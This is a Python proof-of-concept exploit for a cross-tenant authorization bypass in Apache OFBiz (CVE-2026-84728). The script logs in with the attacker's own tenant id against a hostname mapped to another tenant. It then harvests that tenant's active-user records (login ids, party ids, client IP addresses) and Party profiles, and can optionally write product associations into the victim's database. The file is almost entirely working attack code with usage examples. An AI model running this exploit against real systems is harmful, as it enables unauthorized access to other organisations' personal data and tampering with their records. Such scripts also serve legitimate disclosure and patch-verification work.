#!/usr/bin/env python3
"""Apache OFBiz cross-tenant authorization bypass in mapped-domain login (CVE-2026-84728).

ContextFilter resolves the tenant from the request hostname; LoginWorker resolves it
again but prefers the userTenantId request parameter. Submitting your own tenant's id
against a hostname mapped to another tenant authenticates you against your tenant while
the request stays bound to the victim's, so the next request runs the permission check
in your tenant and the read or write against the victim tenant's database. Needs
documented multitenancy and a low-privilege account in any tenant. Fixed in 24.09.08.
"""

import argparse
import html
import json
import os
import re
import sys
from html.parser import HTMLParser

import requests

BOOTSTRAP = "/partymgr/control/main?visualThemeId=COMMON"
# Both apps stay on the victim hostname; only the submitted tenant field selects attacker credentials.
LOGIN = "/partymgr/control/login"
USERS = "/partymgr/control/listLoggedInUsers"
PROFILE = "/partymgr/control/viewprofile"
CATALOG_BOOTSTRAP = "/catalog/control/main?visualThemeId=COMMON"
CATALOG_LOGIN = "/catalog/control/login"
PRODUCT_ASSOC = "/catalog/control/quickAdminUpdateProductAssoc"

# --- terminal UI ---
_BANNER = r"""
  ___  _____ ____ ___ _____
 / _ \|  ___| __ )_ _|__  /
| | | | |_  |  _ \| |  / /
| |_| |  _| | |_) | | / /_
 \___/|_|   |____/___/____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg): sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")
def good(msg): sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")
def warn(msg): sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")
def bad(msg): sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")
def die(msg): bad(msg); sys.exit(1)


def emit(obj):
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    print(json.dumps(obj, ensure_ascii=False, indent=2))
    sys.stdout.flush()
# --- end terminal UI ---


class _Rows(HTMLParser):
    """Collect table rows so the active-user grid can be read back."""
    def __init__(self):
        super().__init__()
        self.rows, self._row, self._cell, self._in = [], None, "", False

    def handle_starttag(self, tag, attrs):
        if tag == "tr":
            self._row = []
        elif tag == "td" and self._row is not None:
            self._in, self._cell = True, ""

    def handle_data(self, data):
        if self._in:
            self._cell += data

    def handle_endtag(self, tag):
        if tag == "td" and self._row is not None:
            self._row.append(self._cell.strip()); self._in = False
        elif tag == "tr" and self._row:
            self.rows.append(self._row); self._row = None


def csrf_token(body):
    m = re.search(r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)', body, re.I)
    return m.group(1) if m else None


def mapped_tenant(body):
    # The hidden login field reveals the tenant that ContextFilter mapped from the victim hostname.
    m = re.search(r'<input\b(?=[^>]*\bname=["\']userTenantId["\'])[^>]*\bvalue=["\']([^"\']+)', body, re.I)
    return html.unescape(m.group(1)) if m else None


def active_users(body):
    # The grid exposes login id, Party id and client address for each victim-tenant session.
    out = []
    p = _Rows(); p.feed(body)
    for row in p.rows:
        if len(row) >= 3 and row[0] and "login id" not in row[0].casefold():
            out.append({"userLoginId": row[0], "partyId": row[1], "clientIpAddress": row[2]})
    return out


def profile_title(body):
    m = re.search(r"The\s+Profile\s+of\s+(.*?)</span>", body, re.I | re.S)
    return html.unescape(" ".join(re.sub(r"<[^>]+>", " ", m.group(1)).split())) if m else None


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s https://victim-host:8443 b-user 'pass' TENANTB --party-id TARGET_PARTY\n"
               "  %(prog)s https://victim-host:8443 b-user 'pass' TENANTB --write A_PRODUCT_1 A_PRODUCT_2\n")
    ap.add_argument("target", metavar="URL", help="victim tenant's mapped HTTPS host")
    ap.add_argument("username", help="account in the attacker's own tenant")
    ap.add_argument("password")
    ap.add_argument("attacker_tenant_id", metavar="TENANT", help="the attacker's own tenant id, sent as userTenantId")
    ap.add_argument("--party-id", metavar="ID", help="also read this victim-tenant Party profile")
    ap.add_argument("--write", nargs=2, metavar=("PRODUCT_ID", "PRODUCT_ID_TO"),
                    help="create a ProductAssoc between two victim-tenant products (needs CATALOG_CREATE)")
    ap.add_argument("--verify-tls", action="store_true", help="verify TLS (off by default; OFBiz ships self-signed certs)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        globals()["_COLOR"] = False

    banner("cross-tenant authorization bypass  ·  CVE-2026-84728")
    base = args.target.rstrip("/")
    session = requests.Session()
    session.verify = args.verify_tls
    if not args.verify_tls:
        requests.packages.urllib3.disable_warnings()

    info(f"Victim host: {base}")
    boot = session.get(base + BOOTSTRAP, timeout=15)
    victim = mapped_tenant(boot.text)
    if not victim:
        die("login page exposed no mapped tenant; this host may not map to one")
    if victim == args.attacker_tenant_id:
        die("host maps to the attacker's own tenant; nothing to cross into")
    good(f"host maps to victim tenant {victim}, logging in as tenant {args.attacker_tenant_id}")

    h = {"X-Requested-With": "XMLHttpRequest"}
    if csrf_token(boot.text):
        h["X-CSRF-Token"] = csrf_token(boot.text)
    # LoginWorker prefers this attacker-controlled tenant id while the request remains on the victim host.
    session.post(base + LOGIN, headers=h, timeout=15, allow_redirects=False, data={
        "USERNAME": args.username, "PASSWORD": args.password,
        "JavaScriptEnabled": "N", "userTenantId": args.attacker_tenant_id})
    party_ok = session.cookies.get("partymgr.securedLoginId") == args.username

    result = {"target": base, "mappedVictimTenantId": victim,
              "credentialTenantId": args.attacker_tenant_id}
    authed = False

    # The Party Manager read needs PARTYMGR access; a catalog-only write account is refused here,
    # so the read is best-effort whenever a write is also requested and fatal otherwise. Nothing is
    # emitted, and authenticatedUser is not recorded, until at least one application authenticates
    # the account, so a wholly rejected login exits non-zero rather than reporting success.
    if party_ok:
        authed = True
        result["authenticatedUser"] = args.username
        good(f"authenticated as {args.username} from tenant {args.attacker_tenant_id}")
        # The following request rebuilds the delegator from the hostname but retains attacker-tenant auth state.
        users = session.get(base + USERS, timeout=15)
        if users.status_code != 200:
            if args.write:
                warn(f"active-user route returned HTTP {users.status_code}; continuing to the catalog write only")
            else:
                die(f"active-user route returned HTTP {users.status_code}")
        else:
            result["loggedInUsers"] = active_users(users.text)
            good(f"recovered {len(result['loggedInUsers'])} victim-tenant active-user record(s)")
            if args.party_id:
                # Party lookup now resolves the supplied id against the victim tenant's database.
                prof = session.get(base + PROFILE, params={"partyId": args.party_id}, timeout=15)
                title = profile_title(prof.text)
                if title:
                    result["profile"] = {"partyId": args.party_id, "title": title}
                    good("recovered a victim-tenant Party profile under attacker-tenant authorisation")
                else:
                    warn(f"no Party profile rendered for {args.party_id!r} (nonexistent, or a different tenant)")
    elif args.write:
        warn("Party Manager login was refused for this account; continuing to the catalog write only")
    else:
        die("cross-tenant login was not accepted; check credentials, tenant id, and target version")

    if args.write:
        pid, pid_to = args.write
        # Catalog uses its own path-scoped JSESSIONID, so the write needs the same mismatched login
        # repeated through /catalog rather than reusing the Party Manager session.
        cboot = session.get(base + CATALOG_BOOTSTRAP, timeout=15)
        ch = {"X-Requested-With": "XMLHttpRequest"}
        if csrf_token(cboot.text):
            ch["X-CSRF-Token"] = csrf_token(cboot.text)
        session.post(base + CATALOG_LOGIN, headers=ch, timeout=15, allow_redirects=False, data={
            "USERNAME": args.username, "PASSWORD": args.password,
            "JavaScriptEnabled": "N", "userTenantId": args.attacker_tenant_id})
        if session.cookies.get("catalog.securedLoginId") != args.username:
            warn("catalog login for the write was not accepted; skipping the write")
        else:
            authed = True
            result.setdefault("authenticatedUser", args.username)
            w = session.post(base + PRODUCT_ASSOC, headers=ch, timeout=15, data={
                "UPDATE_MODE": "CREATE", "PRODUCT_ID": pid, "PRODUCT_ID_TO": pid_to,
                "PRODUCT_ASSOC_TYPE_ID": "ALSO_BOUGHT"})
            # OFBiz returns HTTP 200 even on handler errors, rendering them in an errorMessage
            # container ("The Following Errors Occurred:"). Key off that container, which covers
            # every failure path (missing product, already-exists, write error, missing permission).
            low = w.text.casefold()
            errored = w.status_code != 200 or "the following errors occurred" in low
            reason = ""
            if errored:
                m = re.search(r"The Following Errors Occurred:\s*(.*?)</div>", w.text, re.I | re.S)
                reason = " ".join(re.sub(r"<[^>]+>", " ", m.group(1)).split())[:160] if m else f"HTTP {w.status_code}"
            wrote = not errored
            result["write"] = {"productId": pid, "productIdTo": pid_to, "created": wrote}
            if wrote:
                good(f"ProductAssoc {pid} -> {pid_to} created in the victim tenant")
            else:
                warn(f"write not created: {reason or 'unknown error'}")

    if not authed:
        die("no application accepted the cross-tenant login; check credentials, tenant id, and target version")

    emit(result)


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
